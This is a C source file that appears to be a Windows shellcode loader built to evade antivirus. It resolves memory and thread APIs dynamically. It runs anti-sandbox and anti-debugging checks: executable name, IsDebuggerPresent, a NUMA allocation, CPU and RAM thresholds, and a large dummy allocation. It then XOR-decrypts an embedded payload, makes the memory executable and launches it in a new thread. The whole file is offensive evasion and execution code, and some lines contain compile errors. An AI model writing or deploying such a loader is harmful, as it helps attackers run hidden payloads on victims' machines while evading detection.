#include "lib/crypto.h"
#include "lib/over.h"
#include "lib/matx.h"
   LPVOID (WINAPI* PVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
    
    HANDLE (WINAPI* PCreateThread)(   LPSECURITY_ATTRIBUTES   lpThreadAttributes, SIZE_T  dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress,    LPVOID lpParameter, DWORD  dwCreationFlags,   LPDWORD   lpThreadId);
    
    BOOL (WINAPI* PVirtualProtect)(LPVOID lpAddress,  SIZE_T dwSize,  DWORD  flNewProtect, PDWORD lpflOldProtect);
    
    VOID (WINAPI* PRtlMoveMemory)(VOID UNALIGNED *Destination,const VOID UNALIGNED *Source,SIZE_T Length);
    
    DWORD(WINAPI *PWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
    
    LPVOID (WINAPI* PVirtualAllocExNuma)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect, DWORD  nndPreferred);

    HANDLE (WINAPI* PGetCurrentProcess)();

    PVirtualAlloc = GetProcAddress(GetModuleHandle("Kernel32.dll"),"VirtualAlloc");

    PCreateThread = GetProcAddress(GetModuleHandle("Kernel32.dll"),"CreateThread");

    PVirtualProtect = GetProcAddress(GetModuleHandle("Kernel32.dll"),"VirtualProtect");

    PRtlMoveMemory = GetProcAddress(GetModuleHandle("Kernel32.dll"),"RtlMoveMemory");

    PWaitForSingleObject = GetProcAddress(GetModuleHandle("Kernel32.dll"),"WaitForSingleObject");

    PVirtualAllocExNuma = GetProcAddress(GetModuleHandle("Kernel32.dll"),"VirtualAllocExNuma");

    PGetCurrentProcess = GetProcAddress(GetModuleHandle("Kernel32.dll"),"GetCurrentProcess");

    BOOL check_env(){
        SYSTEM_INFO s;
        DWORD ram ;
        DWORD proc_num;
        MEMORYSTATUSEX mems;
        GetSystemInfo(&s);
        proc_num = s.dwNumberOfProcessors;
        if(proc_num < 2) return FALSE;
        mems.dwLength = sizeof(mems);
        GlobalMemoryStatusEx(&mems)
        ram = mems.ullTotalPhys / 1024 / 1024 / 1024;
        if(ram < 2 ) return FALSE ;
        return TRUE;
    }
    BOOL check_NUMA(){
        LPVOID mem = NULL;
        mem = PVirtualAllocExNuma(PGetCurrentProcess(),NULL, 1000, MEM_RESERVE | MEM_COMMIT,PAGE_EXECUTE_READWRITE, 0);
        return mem != FALSE;
    }
    BOOL kill_env(){
        if(strstr(argv[0] , "evil.exe")==NULL) return FALSE ;
        if(IsDebuggerPresent() ) return FALSE ; 
        if(!check_NUMA()) return FALSE ;
        if(!check_env() ) return FALSE ;
        return TRUE; 
    }

unsigned int payload_size = sizeof(dt_buf);
int main(){
    if(! kill_env())return false ; 
    void *mem_buffer;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect;
    char *mem;
    mem = (char *)malloc(100000000);
    if(mem == NULL){
        return 0;
    }
    memset(mem, 0, 100000000);
    free(mem);
    char key[] = "somthing went wrong";
    mem_buffer = PVirtualAlloc(0 , payload_size , MEM_COMMIT | MEM_RESERVE  , PAGE_READWRITE);
    size_t key_size = sizeof(key);
    size_t buf_size = sizeof(dt_buf);
    XOR(dt_buf,buf_size, key,key_size);
    PRtlMoveMemory(mem_buffer, dt_buf, payload_size);
    rv = PVirtualProtect(mem_buffer , payload_size , PAGE_EXECUTE_READ,&oldprotect);
    if(rv != 0 ){
        th = PCreateThread(0,0,(LPTHREAD_START_ROUTINE )mem_buffer,0,0,0);
        PWaitForSingleObject(th , -1);
    }
    else{
        printf("somthing went wrong");
    }
    return 0;
}